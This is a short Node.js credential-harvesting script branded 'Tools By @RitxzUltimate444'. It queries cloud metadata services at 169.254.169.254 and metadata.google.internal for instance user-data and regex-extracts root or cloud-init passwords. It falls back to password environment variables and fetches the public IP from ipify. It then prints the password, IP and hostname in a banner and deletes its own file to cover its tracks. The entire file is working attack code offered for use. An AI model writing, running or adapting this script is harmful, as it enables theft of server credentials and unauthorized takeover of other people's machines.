const fs = require('fs');
const os = require('os');

async function get(url) {
  try {
    const res = await fetch(url, { 
      headers: { 
        'Metadata-Flavor': 'Google', 
        'Metadata': 'true', 
        'X-Metadata-Service': 'true',
        'Accept': 'application/json' 
      }, 
      signal: AbortSignal.timeout(2500) 
    });
    return res.ok ? await res.text() : null;
  } catch { return null; }
}

(async () => {
  console.log("\n\x1b[35m╔════════════════════════════════════════╗\x1b[0m");
  console.log("\x1b[35m║\x1b[0m \x1b[36m          Tools By @RitxzUltimate444          \x1b[0m \x1b[35m║\x1b[0m");
  console.log("\x1b[35m╚════════════════════════════════════════╝\x1b[0m");

  let pw = 'Not Found', ip = 'N/A', prov = 'Digital Ocean';
  
  try {
    const r = await fetch('https://api.ipify.org'); if (r.ok) ip = (await r.text()).trim();
    const meta = await get('http://169.254.169.254/metadata/v1.json') || 
                 await get('http://169.254.169.254/latest/user-data') || 
                 await get('http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data');
    
    if (meta) {
      const match = meta.match(/password:\s*([^\s\n\\]+)/i) || meta.match(/chpasswd:[\s\S]*?password:\s*([^\s\n\\]+)/i);
      if (match) pw = match[1].replace(/['"}]/g, '');
    }
  } catch (e) {}

  if (pw === 'Not Found') {
    const keys = ['PASSWORD', 'ROOT_PASSWORD', 'USER_PASSWORD', 'SERVER_PASSWORD', 'P_SERVER_PASSWORD'];
    for (const k of keys) { if (process.env[k]) { pw = process.env[k]; break; } }
  }

  console.log(`\x1b[32m[+] PROVIDER  :\x1b[0m ${prov}`);
  console.log(`\x1b[32m[+] IP VPS    :\x1b[0m ${ip}`);
  console.log(`\x1b[32m[+] PW VPS    :\x1b[0m \x1b[31m${pw}\x1b[0m`);
  console.log(`\x1b[32m[+] HOSTNAME  :\x1b[0m ${os.hostname()}`);
  console.log(`\x1b[32m[+] RAM TOTAL :\x1b[0m ${(os.totalmem() / (1024 ** 3)).toFixed(2)} GB`);
  console.log("\x1b[35m========================================\x1b[0m\n");

  setTimeout(() => { try { fs.unlinkSync(__filename); } catch (e) {} process.exit(0); }, 500);
})();
